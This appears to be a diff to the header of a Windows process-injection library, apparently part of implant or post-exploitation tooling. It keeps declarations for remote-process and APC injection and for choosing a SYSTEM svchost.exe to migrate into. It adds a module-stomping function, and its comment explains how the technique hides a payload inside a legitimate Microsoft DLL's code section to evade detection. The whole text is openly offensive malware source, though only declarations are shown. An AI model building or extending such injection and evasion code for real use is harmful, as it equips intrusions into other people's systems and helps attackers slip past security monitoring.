@@ -16,5 +16,13 @@ BOOL InjectRemoteProcess(DWORD pid, const BYTE* payload, SIZE_T payloadSize,
 // APC injection
 BOOL InjectViaApc(DWORD pid, const BYTE* payload, SIZE_T payloadSize);
 
+// Module stomping — load a legitimate System32 DLL into the target, overwrite
+// its .text with the payload, and start a thread at the module base. The
+// payload then runs from an image-backed section of a Microsoft binary instead
+// of a private RX allocation. hostDll must be a DLL the target does not rely
+// on afterwards; the on-disk file stays untouched (copy-on-write).
+BOOL InjectModuleStomp(DWORD pid, const BYTE* payload, SIZE_T payloadSize,
+                       const wchar_t* hostDll, HANDLE* hThreadOut = nullptr);
+
 // Auto-select best SYSTEM svchost.exe for migration (lowest PID)
 DWORD FindBestSvchost();
